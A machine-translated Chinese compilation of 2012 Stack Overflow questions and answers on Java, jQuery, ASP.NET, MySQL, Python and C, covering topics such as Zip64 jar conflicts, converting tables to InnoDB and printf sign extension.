**问：** 我一直在努力让 Apache Commons Zip 64 功能正常工作，特别是 ZipArchiveOutputStream.setUseZip64() 方法。当我尝试使用此方法时，我收到“对于 ZipArchiveOutputStream 类型的方法 setUseZip64(Zip64Mode) 未定义”错误。为什么会发生此错误？

**我尝试了什么我** 花了很长时间在这上面。我将外部 JAR 文件添加（并验证）到项目中。从我在 Eclipse 中看到的内容来看，当我尝试实例化 ZipArchiveOutputStream 时，奇怪的是，对象的签名变为：

> org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream.ZipArchiveOutputStream

请注意重复签名为

> ZipArchiveOutputStream.ZipArchiveOutputStream 。

或者，我手动将源代码添加到实际的项目构建中。当我手动将源代码添加到项目中时，奇怪的是，该方法有效——也就是说，我可以调用

> zipout.setUseZip64(Zip64Mode.Always)

没有问题（并且签名似乎不像上面那样重复）。

理想情况下，我只想引用外部 Apache JAR 文件，而不是在内部添加源代码。因此，为什么会发生此错误？

注意：我还将我自己的 Apache 源代码编译版本构建为单独的 JAR，这也显示了所描述的错误。因此，只有手动将代码添加到实际的 Eclipse 项目中似乎有帮助。

注意：我确保手动添加的版本和外部 JAR 引用之间没有冲突。

**代码示例**

```
import org.apache.commons.compress.*;
import org.apache.commons.compress.archivers.zip.*;
...
ZipArchiveOutputStream zipout = 
    new ZipArchiveOutputStream(new FileOutputStream(filenameandpath));
zipout.setUseZip64(Zip64Mode.Always) ; // ERROR HERE The method setUseZip64(Zip64Mode) 
                                       // is undefined for the type 
                                       // ZipArchiveOutputStream 
```

**配置** Eclipse 3.7（和 4.2）Java 1.6 Apache Commons Compress（版本 1.3 和更新的 1.4）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T15:10:06.733

在解决这个问题几个月后，解决方案是偶然的。

如果同时导入 Apache Commons Zip 和 Mahout Distribution 0.5，就会出现问题。

具体来说，在

```
mahout-examples-0.5.jar 
mahout-examples-0.5-job.jar 
```

这显然也使用了旧版本的 Apache Commons。导入顺序引起了微妙的冲突，导致最近的 Apache Commons 功能无效——除非我手动将 Commons Compress 代码（仅用于测试）导入到项目中——有效地颠覆了与 Mahout 的真正冲突。

# javascript - 使用 jQuery 锁定和解锁页面？

> ID：11603296
> 
> 赞同：0
> 
> 时间：2012-07-22T19:22:21.857
> 
> 标签：javascript, jquery, html, ajax

```
<body>
    <span id="lock">lock</span>
    <div id="one">test test</div>
    <div id="three" style="display: none">hide</div>
    <span id="two">test</span>
    <div id="div_lock">
        Enter password: <input type="password"> <input type="button" value="unlock" id="unlock">
    </div>
</body>

$('#lock').click(function(){
  $('#div_lock').show();
    //????
})

$('#unlock').click(function(){
  $('#div_lock').hide();
//????
}) 
```

如果我点击 LOCK 然后我想打开 div_lock 并隐藏页面中的所有其他元素。如果我点击解锁然后隐藏 div_lock 并显示以前的元素。

我可以使用 .hide 以外的其他功能吗？如果我使用隐藏，则可以检查源代码。也许任何带有简单哈希等的变量？如果不是，我怎么能用 .hide() 和 show() 做这个？我也可以使用 PHP 和 Ajax

[在此处](http://jsfiddle.net/BKkrM/)查看 jsfiddle 。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:15:53.907

最简单的解决方案是：

```
$('#lock').click(function() {
    $(this).siblings().andSelf().fadeOut();
    $('#div_lock').fadeIn();
})

$('#unlock').click(function() {
    $('#div_lock').fadeOut();
    $(this).closest('div').siblings().fadeIn();
})​ 
```

（尽管请注意我使用的是`fadeIn()`and`fadeOut()`而不是“更突然的” `show()`and `hide()`）

[JS 小提琴演示](http://jsfiddle.net/davidThomas/BKkrM/1/)。

还值得记住的是，如果有人可以访问您的浏览器（假设这是某种安全功能），他们仍然可以通过 JavaScript 控制台覆盖它，或者只需刷新页面（假设没有登录）。

* * *

更新以响应 OP 留下的评论（下）：

> 没关系，但是如果我单击解锁，那么这也显示给我`<div id="three" style="display: none">hide</div>`- 这应该我仍然`display:none`

您遇到的问题是，一旦 jQuery 隐藏了*所有*受影响的元素`style="display: none;"`（毕竟它就是这样工作的）；所以我建议一种更整洁的方法，并将内容和控件划分为类似于以下内容的内容：

```
<div id="controls">
    <button id="lock">Lock screen</button>
    <input type="password" />
    <button id="unlock">Unlock screen</button>
</div>
<div id="content">
    <!-- all content goes in here -->
</div>​ 
```

这适用于以下 jQuery（它存储节点以按原样隐藏/显示，然后根据需要恢复它们）：

```
var content = $('#content'),
    contents;
$('#controls').children().slice(1).hide();
$('#lock').click(function() {
    contents = content.html();
    content.empty();
    $(this).hide().siblings().show();
});

$('#unlock').click(function() {
    content.html(contents);
    $(this).closest('div').children().hide().first().show();
});​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/BKkrM/3/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:59:20.907

好吧，我以前遇到过这种情况，并找到了锁定页面的完美解决方案。其实这很简单，您需要做的是使用匿名函数和基本的 jQuery 绑定，更重要的是通过 javascript 动态加载可锁定的 html 数据，因此使用该`View Source`模式将不起作用......这是解决方案：

```
(function($){ //this way nobody can access you variables inside
    var PAGE_CONTENT = "";
    var IS_LOCK_MODE = false;

    var $lockButton = $('#your_lock_button');
    $lockButton.bind('click', function(){
        if(!IS_LOCK_MODE){
            PAGE_CONTENT = $('#your_content_container').html();
            $('#your_content_container').empty();
            IS_LOCK_MODE = true;
        } else {
            $('#your_content_container').html(PAGE_CONTENT);
            PAGE_CONTENT = "";
            IS_LOCK_MODE = false;
        }
    });
})(jQuery); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T20:10:38.337

像这样？

```
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="utf-8">
    <title></title>
</head>
<body>
<style type="text/css">

    .lock_page_div {
        position: absolute;
        top:0;
        left: 0;
        z-index: 9999;
        width: 100%;
        height: 100%;
        display: none;
        background: #ffebcd;
    }
</style>

<a href="javascript:" class="lock_page_a">block page</a>

<div class="lock_page_div">
    <a class="unlock_page_a" href="javascript:">unlock_page_a</a>
</div>

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
        $('.lock_page_a').click(function(){
            $('.lock_page_div').show();
            console.log('lock');
        })

        $('.unlock_page_a').click(function(){
            $('.lock_page_div').hide();
            console.log('unlock');
        })
    })
</script>
</body>
</html> 
```

抱歉，现在 jsfiddle 对我来说太慢了>__<

# java - 谁来决定哪些异常被禁止？

> ID：11603300
> 
> 赞同：3
> 
> 时间：2012-07-22T19:22:47.473
> 
> 标签：java, exception, java-7

据我了解，Java 7 的抑制异常功能是自动的。换句话说，在 6 中的 finally 块中发生的异常会被自动抑制，以支持在资源分配时发生的异常。

因此，在此示例中，a) 打开资源和 b) 关闭资源或 c) 可能两者都可能出错。

据我了解，Java 7 将抛出打开时发生的异常，我们可以要求它给我们抑制的异常，这些异常发生在其他地方。

```
 try (BufferedReader inputReader = Files
            .newBufferedReader(Paths.get(new URI(
                    "file:///Users/me/Desktop/readme.txt")), Charset
                    .defaultCharset())) {
        String inputLine;
        while ((inputLine = inputReader.readLine()) != null) {
            System.out.println(inputLine);
        }
    } 
```

问题是..程序员可以决定什么被压制？毕竟，`public addSuppressed()`有。

请提供示例和用例。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:27:49.000

这不是任意的——被抑制的异常是那些会掩盖导致`try`块失败的主要异常的异常——这就是块中的异常`finally`。此功能可确保您获得整个构造中抛出的**所有**异常，但您捕获的异常将是更重要的异常。

你不能选择被压制的东西。当然，方法就在那里，否则整个事情都行不通。如果您愿意，您可以编写自己的异常处理代码并`addSuppressed`随意使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-16T23:35:06.853

为什么新回复：

1.  更多说明（至少我读过一次就需要它们，尤其是在`catch`侧面）
2.  添加代码
3.  添加了用例/`addSuppressed`用法示例（`catch`）

逐案：

1.  旧的`try`- `catch`- `finally`（或`try`- `finally`）将抑制除`finally`块之外的所有异常。此外，如果您触摸它，则*任何内容*都不会出现在被抑制的例外列表中，无论某些东西是否被抑制。
2.  `try`-with-resources-`finally`将传播`try`异常，其中`finally`一个在禁止列表中。
3.  `try`-...- `catch`-`finally`工作方式类似。如果`catch`抛出，它会抑制`try`异常使其丢失，**除非您`addSupressed()`手动使用捕获异常（将原始异常绑定到正在抛出的新异常）**。我相信这是上一段中接受的答案所涵盖的情况。

`public class WhichIsSupressedTryCatchOrFinally {`

 ````
public static void main(String[] args) {
    try {
//            tryOrFinally(); // throws finally, try one is lost
//            tryCatchOrFinally(); // as above, no suppression info

//            tryWithResourcesOrFinally(); // throws try, adds finally one to it though automatically
        tryWithResourcesCatchOrFinallyCatchThrows();
        tryWithResourcesCatchOrFinallyByHand(); // throws catch, but adding "by hand" try, adds finally also
    } catch (Exception e) {
        e.printStackTrace();
        // System.out.println(Arrays.toString(e.getSuppressed())); -> not needed!
    }
}

static class AResource implements AutoCloseable {

    @Override
    public void close() throws NumberFormatException {
        throw new NumberFormatException("did not see that one coming, did'ya?");
    }
}
private static void tryWithResourcesOrFinally() throws FileNotFoundException {
    try (AResource a = new AResource()) {
        throw new FileNotFoundException("try");
    }
}

private static void tryWithResourcesCatchOrFinallyCatchThrows() throws Exception {
    try (AResource a = new AResource()){
        throw new IOException("try");
    } catch (Exception e) {
        throw new NoSuchElementException("catch");
    }
}

private static void tryWithResourcesCatchOrFinallyByHand() throws Exception {
    try (AResource a = new AResource()){
        throw new IOException("try");
    } catch (Exception e) {
        NoSuchElementException aCatch = new NoSuchElementException("catch");
        aCatch.addSuppressed(e);
        throw aCatch;
    }
}

private static void tryOrFinally() throws Exception {
    try {
        throw new IOException("try");
    } finally {
        throw new Exception("finally");
    }
}

private static void tryCatchOrFinally() throws Exception {
    try {
        throw new IOException("try");
    } catch (Exception e) {
        throw new NoSuchElementException("catch");
    } finally {
        throw new Exception("finally");
    }
} 
```` 

`}`

所以，**你不要选择什么被抑制**，*`addSuppressed`*而是让堆栈跟踪更完整。

输出：

1.  try - catch - finally，catch 抛出中断执行： [![捕捉抛出，没有抑制信息](../Images/7eb6719fe36dd06a9f7ba7703ded6065.png)](https://i.stack.imgur.com/ppw99.png)

2.  try - catch - finally，所有 throws，catch throwable 都被添加了 try 异常，它已经绑定了 finally 一个

[![捕获重新包装，手动添加的抑制信息](../Images/aee1b9cd39c8c482684788c5132add5e.png)](https://i.stack.imgur.com/9pLhR.png)

# c# - ASP.Net LinkBut ton 点击 事件给出错误

> ID：11603302
> 
> 赞同：0
> 
> 时间：2012-07-22T19:23:08.660
> 
> 标签：c#, asp.net, linkbutton

我在我的 asp.net 应用程序的 gridview 控件中有一个链接按钮，它在 page_load（“subscribersearch.aspx”）时生成错误。如何解决此错误？

HTML代码是：

```
<ItemTemplate>
        <asp:LinkButton OnClick="LinkButton_Click" id="lbtnViewSubscriberHistory" CommandName="ViewSubscriberHistory" Visible="true" runat="server" ToolTip="Click to view History." >Subscriber History</asp:LinkButton>
</ItemTemplate> 
```

代码隐藏：

```
void LinkButton_Click(Object sender, EventArgs e)
{
    Alert("Test", "You clicked the link button");
} 
```

错误信息：

System.Web.HttpException (0x80004005)：执行 SubscriberSearch.aspx 的子请求时出错。--->

System.Web.HttpCompileException (0x80004005): l:\CorpApp\Web\us\SubscriberSearch.aspx(365):
错误 CS1061: 'ASP.subscribersearch_aspx' 不包含 'LinkBut​​ton_Click' 的定义并且没有扩展方法 'LinkBut​​ton_Click' 接受可以找到“ASP.subscribersearch_aspx”类型的第一个参数（您是否缺少 using 指令或程序集引用？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T19:25:53.080

在方法前添加protected

```
protected void LinkButton_Click(Object sender, EventArgs e)
{
    Alert("Test", "You clicked the link button");
} 
```

# mysql - MySQL：InnoDB 与 MyISAM：如何以及为什么要改变（Amazon RDS）？

> ID：11603303
> 
> 赞同：9
> 
> 时间：2012-07-22T19:23:10.360
> 
> 标签：mysql, amazon-web-services, innodb, myisam, amazon-rds

我没有设置我的数据库并注意到我的一些表是 innoDB 而其他的是 MyISAM。我之所以对更改它们感兴趣是因为[Jurg van Vliet](http://www.quora.com/Jurg-van-Vliet)（他在 AWS 上撰写 O'Reilly 书籍）[说](http://www.quora.com/What-are-the-pros-cons-of-hosting-a-MySQL-DB-in-Amazon-RDS-versus-a-DB-instance-in-EC2)Amazon RDS 的自动数据库备份能力取决于所有表都是 innoDB 表。

将数据库中的所有表转换为 InnoDB 的命令是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-22T19:38:45.290

这是一个将当前数据库中的所有 MyISAM 表转换为 InnoDB 的存储过程：

```
DROP PROCEDURE IF EXISTS convert_all_tables_to_innodb;

DELIMITER //

CREATE PROCEDURE convert_all_tables_to_innodb()
DETERMINISTIC
MODIFIES SQL DATA
SQL SECURITY INVOKER
COMMENT ''
proc: BEGIN
    DECLARE b_not_found     BOOL DEFAULT FALSE;
    DECLARE v_table_name VARCHAR(255);
    DECLARE cur1 CURSOR FOR
SELECT
table_name
FROM
information_schema.tables
WHERE
table_schema = DATABASE() AND
table_type = 'BASE TABLE' AND
engine = 'MyISAM'
ORDER BY
1;
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET b_not_found = TRUE;

    OPEN cur1;

    SET b_not_found = FALSE;

    loop1: LOOP
        FETCH cur1 INTO v_table_name;
        IF b_not_found THEN
            LEAVE loop1;
        END IF;

        SET @sql = CONCAT('ALTER TABLE ', v_table_name, ' ENGINE=InnoDB');

        PREPARE stmt FROM @sql;
        EXECUTE stmt;
        DROP PREPARE stmt;
    END LOOP;

    CLOSE cur1;
END;
//

DELIMITER ; 
```

要运行它，只需执行：

```
CALL convert_all_tables_to_innodb(); 
```

# python - 如何从python中的私有类继承父类属性？

> ID：11603309
> 
> 赞同：-1
> 
> 时间：2012-07-22T19:24:10.733
> 
> 标签：python, class, inheritance, parent-child

我一直在寻找这个问题的答案，但还没有运气。我需要让子类访问其父类中属性的值。

这是一个例子：

```
class myclass:
    def __init__(self):

        class __firstinternal__:
            def __init__(self):
                self.second = __secondinternal__()

        class __secondinternal__:
            def __init__(self):
                self.var = myclass.getString()

    def getString(self):
        return "something"

    self.internal = __firstinternal__()
    print self.internal.second.var

c = myclass()
Traceback (most recent call last):
  File "./inheritest.py", line 19, in <module>
    c = myclass()
  File "./inheritest.py", line 15, in __init__
    self.internal = __firstinternal__()
  File "./inheritest.py", line 7, in __init__
    self.second = __secondinternal__()
  File "./inheritest.py", line 11, in __init__
    self.anothervar = myclass.getString()
AttributeError: class myclass has no attribute 'getString' 
```

换句话说，我需要**secondinternal**从父 myclass 继承方法 getString()。

当班级不是孩子时，我已经找到了如何做到这一点，但我想将这两个班级保密。

有任何想法吗？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:38:17.757

目前尚不清楚“子类”和“父类”是什么意思。在另一个类中定义一个类不是通常的 Python 模式。您需要详细说明您如何使用这些术语。此外，您发布的代码没有给出您描述的错误，因此您发布的代码似乎与您正在运行的代码不同。

根据您的代码，我可以给出的最佳答案是，“您无法做您想做的事情。” 如果您`__firstinternal__`在 的`__init__`方法内定义`myclass`，则它没有对 的引用`myclass`，因此它无法访问它或它的任何方法。 `myclass`直到定义了所有方法之后才存在，因此方法中的任何内容都无法在类定义时访问类定义的其他部分。您可以在运行时通过 访问它`myclass.getString()`，您说这不起作用，但如前所述，这是没有意义的，因为您给出的错误不是代码实际所做的。

您可能应该使用继承而不是在彼此内部定义类，但这只是一个疯狂的猜测。

您应该阅读[Python 教程](http://docs.python.org/tutorial/)以了解如何在 Python 中使用类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:04:21.493

你的代码很混乱。据我所知，这里有两种不同的方法来做类似于你想要的事情。

```
class myclass:
    def __init__(self):
        pass

    def getString(self):
        return "something"

class child(myclass):
    def __init__(self):
        self.var = self.getString()

    def someMethod(self):
        return "hello" 
```

...及其输出：

```
>>> c = child()
>>> print c.var
something 
```

在这里，我定义了一个父类`myclass`并使`child`继承`myclass`。然后它可以`getString`正常调用，因为它继承了它。

如果你需要保持你的类是私有的（这在 python 中不是一个常见的习惯用法），这是一种方法：

```
class myclass2:
    def __init__(self):
        class temp(myclass2): # inherits myclass
            def __init__(self):
                self.var = self.getString()

        self.__privateClass = temp 

    def getString(self):
        return "something else"

    def test(self):
        temp = self.__privateClass()
        print temp.var 
```

和输出：

```
>>> m = myclass2()
>>> m.test() 
```

...虽然这种方法有点傻。

另请注意，双下划线用于将某些内容标记为私有，而不是子类。（另请注意，“私有变量”的概念在 python 中与其他语言不同。 [更多信息](https://stackoverflow.com/questions/1641219/does-python-have-private-variables-in-classes)）

# javascript - 在一页中使用相同的 JavaScript 函数两次

> ID：11603310
> 
> 赞同：-2
> 
> 时间：2012-07-22T19:24:32.013
> 
> 标签：javascript

我在[这个网站](http://fawky.de/fawky/powerbikes/werkstatt.html#elektrik)上使用了一个 javascript 函数来展示图像的幻灯片。但是，当我尝试复制 javascript 函数并将其用于“Bremsen”时。它不起作用。无论如何，您可以给javascript一个ID，以便两个动画同时工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:01:51.083

很抱歉，人们在没有提供正当理由的情况下对您的问题投了如此糟糕的票！（这是不好的礼仪）但是您给定链接上的 javascript 编写得不好，并且它缺乏[模块化](http://en.wikipedia.org/wiki/Modular_design)实际上阻止了您在单个页面上多次使用它。

每个 Javascript 函数都必须有一个唯一的名称（在给定的[命名空间](http://www.javascripttoolbox.com/bestpractices/#namespace)中），但是在您的示例中，您试图定义两个都称为“slideit”的函数。

我想我无法向您描述如何从这里有效地完成这项工作。您需要学习如何正确编写 javascript（学习在对象中使用和存储信息以及将变量传递给函数）；

首先学习[基础知识](http://www.w3schools.com/js/default.asp)，然后学习使用诸如[jQuery](http://jquery.com/)之类的框架，它提供了对许多有用功能的访问，以便快速（相对）轻松地完成工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:07:29.730

我认为问题在于您使用的是相同的变量。现在，解决方案是重命名您在函数的每个实例中使用的变量，例如：

```
var stepX=1
function slideitX(){

document.images.slidee.src=eval("imagee"+stepX+".src")
if (stepX>5)
stepX++
else
stepX=1

setTimeout("slideitX()",3000)
}
slideitX() 
```

但这不是一个好习惯，我同意@killercowuk

# mysql - 无法运行查询

> ID：11603315
> 
> 赞同：1
> 
> 时间：2012-07-22T19:25:01.603
> 
> 标签：mysql, sql, mysql-error-1242

我必须根据下表找到结果

学生 StudentPapersSelection as sps StudentGroupManagegemt as sgm 内部数据 as iars

从学生我需要学生 rollno 和 name where iars's paperid = sps's paperid 和 iars groupid= sgm group id 和 students id 应该基于前两件事。

我正在运行的查询是：

```
select students.rollno, students.name 
from students,sps,iars,sgm 
where iars.id=1
and students.studentid=(select studentid 
                        from sps where sps.paperid=iars.paperid
                        and iars.id=1)
and students.studentid=(select studentid 
                        from sgm 
                        where sgm.groupid=iars.groupid 
                        and iars.id=1) 
and students.course=iars.courseid  
and students.semester=iars.semester 
```

它说查询返回超过 1 行。我讨厌这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:44:48.920

从您的评论和问题中的有限信息来看，您似乎想要做什么而不是

`...students.studentid=(select studentid ...`

是用

`...students.studentid in(select studentid ...`

所以你的查询应该是这样的：

```
select students.rollno, students.name from students,sps,iars,sgm where iars.id=1
    and students.studentid in (select studentid from sps 
        where sps.paperid=iars.paperid and iars.id=1) 
    and students.studentid in (select studentid from sgm
        where sgm.groupid=iars.groupid and iars.id=1) 
    and students.course=iars.courseid 
    and students.semester=iars.semester 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:18:18.553

我会尝试我猜：

```
select  students.rollno,
        students.name
from    iars, students join sps on students.studentid = sps.studentid
        join sgm on students.studentid = sgm.studentid
where   iars.id = 1 
and     sps.paperid=iars.paperid
and     sgm.groupid=iars.groupid
and     students.course = iars.courseid
and     students.semester = iars.semester 
```

假设这样的表：

```
CREATE TABLE `students` (
  `studentid` int(11) NOT NULL AUTO_INCREMENT,
  `rollno` int(11) DEFAULT NULL,
  `name` varchar(255) DEFAULT NULL,
  `course` int(11) DEFAULT NULL,
  `semester` int(11) DEFAULT NULL,
  PRIMARY KEY (`studentid`)
) ENGINE=InnoDB AUTO_INCREMENT=66820 DEFAULT CHARSET=latin1

CREATE TABLE `sps` (
  `studentid` int(11) NOT NULL AUTO_INCREMENT,
  `paperid` int(11) DEFAULT NULL,
  PRIMARY KEY (`studentid`)
) ENGINE=InnoDB AUTO_INCREMENT=66820 DEFAULT CHARSET=latin1

CREATE TABLE `sgm` (
  `studentid` int(11) NOT NULL AUTO_INCREMENT,
  `groupid` int(11) DEFAULT NULL,
  PRIMARY KEY (`studentid`)
) ENGINE=InnoDB AUTO_INCREMENT=66820 DEFAULT CHARSET=latin1

CREATE TABLE `iars` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `paperid` int(11) DEFAULT NULL,
  `groupid` int(11) DEFAULT NULL,
  `courseid` int(11) DEFAULT NULL,
  `semester` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=66820 DEFAULT CHARSET=latin1 
```

和这样的数据：

```
insert into students values (1,1,'a',1,1);
insert into students values (2,1,'b',1,1);
insert into iars values(1,1,1,1,1);
insert into sgm values (1,1);
insert into sps values (1,1); 
```

# android - 树视图列表动画

> ID：11603318
> 
> 赞同：2
> 
> 时间：2012-07-22T19:25:51.217
> 
> 标签：android, animation

我正在使用[tree-view-list](http://code.google.com/p/tree-view-list-android/)开源项目，我想知道是否有人知道如何使用这个库来展开和折叠带有动画的节点。提前致谢。

# java - 如何在 Eclipse 中查看超类的所有继承（可覆盖）方法？

> ID：11603319
> 
> 赞同：2
> 
> 时间：2012-07-22T19:25:52.090
> 
> 标签：java, eclipse

当我说

```
class Foo extends Bar{

} 
```

在 Eclipse 中检查 Bar 的继承（和 Overideable）成员的最简单（阅读大多数 IDE 特定）方法是什么？我似乎找不到任何面板或窗口可以看到它们及其随附的文档（如果有附件）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T19:37:03.470

控件 O 显示此类中的所有当前方法。控件 O 再次显示所有方法以及其祖先的所有方法。方法名称旁边的 F 表示它是最终的。

然后，您可以使用箭头键选择特定方法，然后输入以转到其声明和关联的 javadoc。

**编辑**

您也可以在类主体的某处（在方法或内部类之外）进行控制空间，并且代码完整将显示您可以覆盖哪些方法

![在此处输入图像描述](../Images/96558e032122fa1d96e845d2e3e16dd8.png)

# c - printf 如何知道符号扩展后要打印的内容

> ID：11603323
> 
> 赞同：0
> 
> 时间：2012-07-22T19:26:01.037
> 
> 标签：c

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv){
    char i = -128; 
    int j = i; 
    printf("%d %u\n", j, j); 
   return 0;
} 
```

结果是`-128 4294967168`

我认为是

```
i: 10000000 
```

在赋值运算符之后，进行符号扩展

```
j: 11111111 11111111 11111111 10000000 
```

我想问的是如何`printf("%d",j)`知道打印`-128`只是使用

最后一个字节？这个怎么运作？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T19:29:05.220

> 我想问的是 printf("%d",j) 如何知道打印 -128 只使用最后一个字节？

它没有。它被告知要打印一个有符号的`int`，因此它从堆栈中获取适当数量的字节 - 现在通常为 4 个 - 并将该位模式解释为有符号`int`。

当您将负数分配给`char`变量`int`时，就像在`int j = i;`这里一样，发生的事情并不是真正的符号扩展，而是 - 因为 a`char`可以表示的所有值也可以表示为`int`- 保值转换，所以`char` `i`转换为`int`具有相同的价值。

在迄今为止最常见的二进制补码机器上，以及在二进制补码中，保值转换恰好与符号扩展一致，但如果表示是符号和幅度，则转换会有所不同。

由于 -128 不能表示为 1 的补码或符号和幅度中的有符号 8 位整数，让我们看看在将 -127 转换为具有相同类型的 32 位有符号整数时位模式会发生什么表示：

二进制补码：

```
10000001 -> 11111111 11111111 11111111 10000001 
```

一个的补码：

```
10000000 -> 11111111 11111111 11111111 10000000 
```

符号和大小：

```
11111111 -> 10000000 00000000 00000000 01111111 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T19:28:47.463

它只打印 -128 的无符号版本（在这种情况下为**int**）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T19:32:58.667

您强制强制转换以查看整数的第一个字节：

```
char j = -128; 
printf("%d", (char) j); 
```

要将第二个字节视为十进制，您可以强制进行强制转换：

```
printf("%d", *(((char *) &j) + 1 ) ); 
```

整数的最后一个字节：

```
printf("%d", *(((char *) &j) + 3 ) ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-22T19:36:16.390

您的程序通过将错误的类型传递给`printf`. `%u`需要一个`unsigned`参数，但您传递了一个 (signed) `int`。`printf`不“知道该做什么”，因为它不需要做任何特别的事情；因为你调用了UB，所以无论发生什么都是自由的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-22T20:10:29.867

这是一个简单的测试程序，可以帮助您了解发生了什么。请注意，它使用 C99 长度修饰符`hh`，这意味着：

> `hh`指定后面的`d`, `i`, `o`, `u`, `x`, 或`X`转换说明符应用于 `signed char`or`unsigned char`参数（该参数将根据整数提升进行提升，但其值应转换为`signed char`或`unsigned char`在打印之前）；或者后面的`n`转换说明符适用于指向`signed char` 参数的指针。

这可以帮助您了解如何处理类型。

```
#include <stdio.h>
#include <limits.h>

static void print_value(signed char sc, unsigned char uc, /*plain*/ char pc)
{
    int j1 = sc;
    int j2 = uc;
    int j3 = pc;
    printf("%-9s  %4hhd %4hhu %4d 0x%hhX %10u\n", "Signed:",   j1, j1, j1, j1, j1);
    printf("%-9s  %4hhd %4hhu %4d 0x%hhX %10u\n", "Unsigned:", j2, j2, j2, j2, j2);
    printf("%-9s  %4hhd %4hhu %4d 0x%hhX %10u\n", "Plain:",    j3, j3, j3, j3, j3);
}

static void check_value(int i)
{
        signed    char sc = i;
        unsigned  char uc = i;
        /*plain*/ char pc = i;
        print_value(sc, uc, pc);
}

int main(void)
{
    for (int i = 0; i <= 3; i++)
        check_value(i);
    for (int i = SCHAR_MAX - 3; i <= SCHAR_MAX+3; i++)
        check_value(i);
    for (int i = UCHAR_MAX - 3; i <= UCHAR_MAX; i++)
        check_value(i);
    return 0;
} 
```

编译时`-fsigned-char`（所以 'plain'`char`是有符号类型），输出为：

```
Signed:       0    0    0 0x0          0
Unsigned:     0    0    0 0x0          0
Plain:        0    0    0 0x0          0
Signed:       1    1    1 0x1          1
Unsigned:     1    1    1 0x1          1
Plain:        1    1    1 0x1          1
Signed:       2    2    2 0x2          2
Unsigned:     2    2    2 0x2          2
Plain:        2    2    2 0x2          2
Signed:       3    3    3 0x3          3
Unsigned:     3    3    3 0x3          3
Plain:        3    3    3 0x3          3
Signed:     124  124  124 0x7C        124
Unsigned:   124  124  124 0x7C        124
Plain:      124  124  124 0x7C        124
Signed:     125  125  125 0x7D        125
Unsigned:   125  125  125 0x7D        125
Plain:      125  125  125 0x7D        125
Signed:     126  126  126 0x7E        126
Unsigned:   126  126  126 0x7E        126
Plain:      126  126  126 0x7E        126
Signed:     127  127  127 0x7F        127
Unsigned:   127  127  127 0x7F        127
Plain:      127  127  127 0x7F        127
Signed:    -128  128 -128 0x80 4294967168
Unsigned:  -128  128  128 0x80        128
Plain:     -128  128 -128 0x80 4294967168
Signed:    -127  129 -127 0x81 4294967169
Unsigned:  -127  129  129 0x81        129
Plain:     -127  129 -127 0x81 4294967169
Signed:    -126  130 -126 0x82 4294967170
Unsigned:  -126  130  130 0x82        130
Plain:     -126  130 -126 0x82 4294967170
Signed:      -4  252   -4 0xFC 4294967292
Unsigned:    -4  252  252 0xFC        252
Plain:       -4  252   -4 0xFC 4294967292
Signed:      -3  253   -3 0xFD 4294967293
Unsigned:    -3  253  253 0xFD        253
Plain:       -3  253   -3 0xFD 4294967293
Signed:      -2  254   -2 0xFE 4294967294
Unsigned:    -2  254  254 0xFE        254
Plain:       -2  254   -2 0xFE 4294967294
Signed:      -1  255   -1 0xFF 4294967295
Unsigned:    -1  255  255 0xFF        255
Plain:       -1  255   -1 0xFF 4294967295 
```

用 -funsigned-char 编译`(so 'plain'`char` 是无符号类型），输出为：

```
Signed:       0    0    0 0x0          0
Unsigned:     0    0    0 0x0          0
Plain:        0    0    0 0x0          0
Signed:       1    1    1 0x1          1
Unsigned:     1    1    1 0x1          1
Plain:        1    1    1 0x1          1
Signed:       2    2    2 0x2          2
Unsigned:     2    2    2 0x2          2
Plain:        2    2    2 0x2          2
Signed:       3    3    3 0x3          3
Unsigned:     3    3    3 0x3          3
Plain:        3    3    3 0x3          3
Signed:     124  124  124 0x7C        124
Unsigned:   124  124  124 0x7C        124
Plain:      124  124  124 0x7C        124
Signed:     125  125  125 0x7D        125
Unsigned:   125  125  125 0x7D        125
Plain:      125  125  125 0x7D        125
Signed:     126  126  126 0x7E        126
Unsigned:   126  126  126 0x7E        126
Plain:      126  126  126 0x7E        126
Signed:     127  127  127 0x7F        127
Unsigned:   127  127  127 0x7F        127
Plain:      127  127  127 0x7F        127
Signed:    -128  128 -128 0x80 4294967168
Unsigned:  -128  128  128 0x80        128
Plain:     -128  128  128 0x80        128
Signed:    -127  129 -127 0x81 4294967169
Unsigned:  -127  129  129 0x81        129
Plain:     -127  129  129 0x81        129
Signed:    -126  130 -126 0x82 4294967170
Unsigned:  -126  130  130 0x82        130
Plain:     -126  130  130 0x82        130
Signed:      -4  252   -4 0xFC 4294967292
Unsigned:    -4  252  252 0xFC        252
